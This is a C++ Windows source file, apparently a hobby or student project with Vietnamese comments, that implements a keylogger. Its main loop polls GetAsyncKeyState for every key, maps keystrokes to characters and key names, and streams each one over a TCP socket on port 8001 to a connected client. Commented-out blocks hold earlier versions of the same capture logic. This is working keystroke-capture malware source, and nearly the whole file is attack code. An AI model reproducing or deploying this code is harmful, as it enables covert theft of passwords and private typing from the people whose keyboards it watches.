#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#define _WIN32_WINNT 0x0600
#define MAX_CONNECTIONS 1
#pragma warning(disable : 4996)
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <cstdlib>
#include <conio.h>
#include <iostream>
#include <map>
using namespace std;
#pragma comment(lib, "Ws2_32.lib")

// char batPhimNhan() {
//     char key_press;
//     int ascii_value;
//     cout << "Nhap phim bat ky de kiem tra ma ASCII\nAn ESC de thoat!\n\n\n";
//     while (1)
//     {
//         if (kbhit()) {
//             key_press = getch();
//             ascii_value = key_press;
//             if (ascii_value == 27) // For ESC
//                 break;
//             cout << "Ban nhap phim-> \" " << key_press << " \" Gia tri ASCII =  " << ascii_value << "\n";
//         }
//     }
// }

bool IsCapitalized(short int shift, short int caps)
{
    bool s = shift < 0;
    bool c = (caps & 1) != 0;
    return s != c;
}

bool isHotKey(short t)
{
    if (t == VK_F1 || t == VK_F2 || t == VK_F3 || t == VK_F4 || t == VK_F5 || t == VK_F6 || t == VK_F7 || t == VK_F8 || t == VK_F9 || t == VK_F10 || t == VK_F11 || t == VK_F12)
        return true;
    if (t == VK_LBUTTON || t == VK_RBUTTON || t == VK_MBUTTON)
        return true;
    if (t == VK_BACK || t == VK_TAB || t == VK_RETURN)
        return true;
    if (t == VK_SNAPSHOT || t == VK_INSERT || t == VK_DELETE)
        return true;
    if (t == VK_CAPITAL || t == VK_MENU || t == VK_CONTROL || t == VK_SHIFT || t == VK_SLEEP || t == VK_NUMLOCK || t == VK_SPACE)
        return true;
    if (t == VK_LEFT || t == VK_UP || t == VK_RIGHT || t == VK_DOWN)
        return true;
    if (t == VK_HOME || t == VK_PRIOR || t == VK_NEXT || t == VK_END)
        return true;

    return false;
}

void findHotKey(short t, char *c)
{
    if (t == VK_F1)
        strcpy(c, "F1");
    if (t == VK_F2)
        strcpy(c, "F2");
    if (t == VK_F3)
        strcpy(c, "F3");
    if (t == VK_F4)
        strcpy(c, "F4");
    if (t == VK_F5)
        strcpy(c, "F5");
    if (t == VK_F6)
        strcpy(c, "F6");
    if (t == VK_F7)
        strcpy(c, "F7");
    if (t == VK_F8)
        strcpy(c, "F8");
    if (t == VK_F9)
        strcpy(c, "F9");
    if (t == VK_F10)
        strcpy(c, "F10");
    if (t == VK_F11)
        strcpy(c, "F11");
    if (t == VK_F12)
        strcpy(c, "F12");

    if (t == VK_LBUTTON)
        strcpy(c, "Left Mouse");
    if (t == VK_RBUTTON)
        strcpy(c, "Right Mouse");
    if (t == VK_MBUTTON)
        strcpy(c, "Middle Mouse");

    if (t == VK_BACK)
        strcpy(c, "Backspace");
    if (t == VK_TAB)
        strcpy(c, "Tab");
    if (t == VK_RETURN)
        strcpy(c, "Enter");
    if (t == VK_SNAPSHOT)
        strcpy(c, "Print screen");
    if (t == VK_INSERT)
        strcpy(c, "Insert");
    if (t == VK_DELETE)
        strcpy(c, "Delete");

    if (t == VK_CAPITAL)
        strcpy(c, "Cap lock");
    if (t == VK_MENU)
        strcpy(c, "Alt");
    if (t == VK_CONTROL)
        strcpy(c, "Ctrl");
    if (t == VK_SHIFT)
        strcpy(c, "Shift");
    if (t == VK_SLEEP)
        strcpy(c, "Sleep");
    if (t == VK_NUMLOCK)
        strcpy(c, "Num lock");
    if (t == VK_SPACE)
        strcpy(c, "Space");
    if (t == VK_LEFT)
        strcpy(c, "Left arrow");
    if (t == VK_UP)
        strcpy(c, "Up arrow");
    if (t == VK_RIGHT)
        strcpy(c, "Right arrow");
    if (t == VK_DOWN)
        strcpy(c, "Down arrow");
    if (t == VK_HOME)
        strcpy(c, "Home");
    if (t == VK_PRIOR)
        strcpy(c, "Page up");
    if (t == VK_NEXT)
        strcpy(c, "Page down");
    if (t == VK_END)
        strcpy(c, "End");

    c[strlen(c)] = '\0';
}

void shiftWith(short t, char *c)
{
    if (t == '1')
        strcpy(c, "!");
    if (t == '2')
        strcpy(c, "@");
    if (t == '3')
        strcpy(c, "#");
    if (t == '4')
        strcpy(c, "$");
    if (t == '5')
        strcpy(c, "%");
    if (t == '6')
        strcpy(c, "^");
    if (t == '7')
        strcpy(c, "&");
    if (t == '8')
        strcpy(c, "*");
    if (t == '9')
        strcpy(c, "(");
    if (t == '0')
        strcpy(c, ")");
    if (t == VK_OEM_1)
        strcpy(c, ":");
    if (t == VK_OEM_PLUS)
        strcpy(c, "+");
    if (t == VK_OEM_COMMA)
        strcpy(c, "<");
    if (t == VK_OEM_MINUS)
        strcpy(c, "_");
    if (t == VK_OEM_PERIOD)
        strcpy(c, ">");
    if (t == VK_OEM_2)
        strcpy(c, "?");
    if (t == VK_OEM_3)
        strcpy(c, "~");
    if (t == VK_OEM_4)
        strcpy(c, "{");
    if (t == VK_OEM_5)
        strcpy(c, "|");
    if (t == VK_OEM_6)
        strcpy(c, "}");
    if (t == VK_OEM_7)
        strcpy(c, "\"");
}

int main()
{
    int iResult;
    WSADATA wsaData;
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
    {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }
    else
    {
        printf("Winsock DLL found!\n");
        printf("status: %s\n", wsaData.szSystemStatus);
    }

    SOCKET serverSocket = INVALID_SOCKET;
    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET)
    {
        printf("Cannot create a socket!\n");
        WSACleanup();
        return 1;
    }
    else
    {
        printf("socket() is OK!\n");
    }

    sockaddr_in service;
    service.sin_family = AF_INET;
    service.sin_port = htons(8001); // little endian -> big endian
    PCWSTR pszAddrString = L"127.0.0.1";
    int result = InetPtonW(AF_INET, pszAddrString, &service.sin_addr.s_addr);

    if (bind(serverSocket, (SOCKADDR *)&service, sizeof(service)) == SOCKET_ERROR)
    {
        printf("Error: %s\n", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
    }
    else
    {
        printf("bind() is OK!\n");
    }

    if (listen(serverSocket, MAX_CONNECTIONS) == SOCKET_ERROR)
    {
        printf("Error: %s\n", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
    }
    else
    {
        printf("listen() is OK!\n");
        printf("waiting for the connections...\n");
    }
    SOCKET *acceptedSockets = new SOCKET[MAX_CONNECTIONS];
    for (int i = 0; i < MAX_CONNECTIONS; i++)
    {
        acceptedSockets[i] = accept(serverSocket, NULL, NULL);
        if (acceptedSockets[i] == INVALID_SOCKET)
        {
            printf("socket %d connects failed!\nError: %s\n", i, WSAGetLastError());
            acceptedSockets[i] = NULL;
        }
        else
        {
            printf_s("socket %d connects successful\n", i);
            char *c = new char[10];
            int count = 0;
            while (acceptedSockets[i] != INVALID_SOCKET)
            {
                // printf("waiting for respone...\n\n");
                // char receivedBuf[1001];
                // int BytesCount = recv(acceptedSockets[i], receivedBuf, 1001, 0);
                // if (BytesCount == SOCKET_ERROR)
                /*{
                    printf("Something wrong!\nError: %s\n", WSAGetLastError());
                }
                else*/
                //{
                // printf("Message received: %s\n", receivedBuf);

                /*printf("Input your message: ");
                cin.getline(receivedBuf, 1000);
                BytesCount = send(acceptedSockets[i], receivedBuf, 1001, 0);
                if (BytesCount == SOCKET_ERROR)
                {
                    printf("Something wrong!\nError: %s", WSAGetLastError());
                }
                else {
                    printf("Send success, send %ld bytes to server\n", BytesCount);
                }*/
                /*while (true) {
                    if (_kbhit()) {
                        s[0] = _getch();
                        s[1] = '\0';
                        cout << s << endl;
                        int BytesCount = send(acceptedSockets[i], s, 1001, 0);
                        if (BytesCount == SOCKET_ERROR)
                        {
                            printf("Something wrong!\nError: %s", WSAGetLastError());
                        }
                    }
                }*/
                // for (int t = 0; t < 256; t++)
                // {
                //     if(GetAsyncKeyState(VK_LSHIFT) & 1){
                //         strcpy(c, "Shift");
                //         c[strlen(c)] = '\0';
                //         puts(c);
                //         int BytesCount = send(acceptedSockets[i], c, 4, 0);
                //         if (BytesCount == SOCKET_ERROR)
                //         {
                //             printf("Something wrong!\nError: %s", WSAGetLastError());
                //         }
                //     }
                //     else if (GetAsyncKeyState(t) & 1)
                //     {
                //         map<int, int> shiftWith;
                //         shiftWith[0x30] = int('!');
                //         bool flag = 0;
                //         int temp = t;
                //         if(temp >= int('A') && temp <= int('Z') ){
                //         short int shift = GetAsyncKeyState(VK_SHIFT);
                //         short int caps = GetKeyState(VK_CAPITAL);
                //         if(shift < 0){
                //             cout << "haha" << endl;
                //             map<int, int>::iterator it = shiftWith.find(t);
                //             if(it != shiftWith.end()){
                //                 c[0] = shiftWith[t];
                //                 flag = 1;
                //             }
                //         }
                //         if(!IsCapitalized(shift, caps))
                //           temp += 32;
                //             cout << "Get the key event number: " << temp  << ", char: " << char(temp) << endl;
                //         }else
                //             cout << "Get the key event number: " << temp  << ", char: " << char(MapVirtualKey(temp, MAPVK_VK_TO_CHAR)) << endl;
                //         if(flag == 0)
                //             c[0] = char(MapVirtualKey(temp, MAPVK_VK_TO_CHAR));
                //         c[1] = '\0';
                //         puts(c);
                //         int BytesCount = send(acceptedSockets[i], c, 4, 0);
                //         if (BytesCount == SOCKET_ERROR)
                //         {
                //             printf("Something wrong!\nError: %s", WSAGetLastError());
                //         }
                //     }
                // }
                // cout << count++ << endl;

                for (int t = 0; t < 256; t++)
                {
                    if (GetAsyncKeyState(t) & 1)
                    {
                        if (t >= 160 && t <= 165)
                            continue;
                        else if (t >= int('A') && t <= int('Z'))
                        {
                            short int shift = GetAsyncKeyState(VK_SHIFT);
                            short int caps = GetKeyState(VK_CAPITAL);
                            if (!IsCapitalized(shift, caps))
                            {
                                c[0] = t + 32;
                                c[1] = '\0';
                            }
                            else
                            {
                                c[0] = char(MapVirtualKey(t, MAPVK_VK_TO_CHAR));
                                c[1] = '\0';
                            }
                        }
                        else if (isHotKey(t))
                            findHotKey(t, c);
                        else if (GetAsyncKeyState(VK_SHIFT) < 0)
                            shiftWith(t, c);
                        else
                        {
                            c[0] = char(MapVirtualKey(t, MAPVK_VK_TO_CHAR));
                            c[1] = '\0';
                        }
                        int BytesCount = send(acceptedSockets[i], c, 10, 0);
                        if (BytesCount == SOCKET_ERROR)
                        {
                            printf("Something wrong!\nError: %s", WSAGetLastError());
                        }
                                        }
                } // cout << count++ << endl;
                Sleep(150);
                //}
            }
            /*if (kbhit()) {
                char press_key = getch();
                int BytesCount = send(serverSocket, &press_key, 1, 0);
                if (BytesCount == SOCKET_ERROR)
                {
                    printf("Something wrong!\nError: %s", WSAGetLastError());
                }
                else {
                    printf("Send success, send %ld bytes to server\n", BytesCount);
                }
            }*/
        }
    }
    fflush(stdin);
    closesocket(serverSocket);
    WSACleanup();
    return 0;
}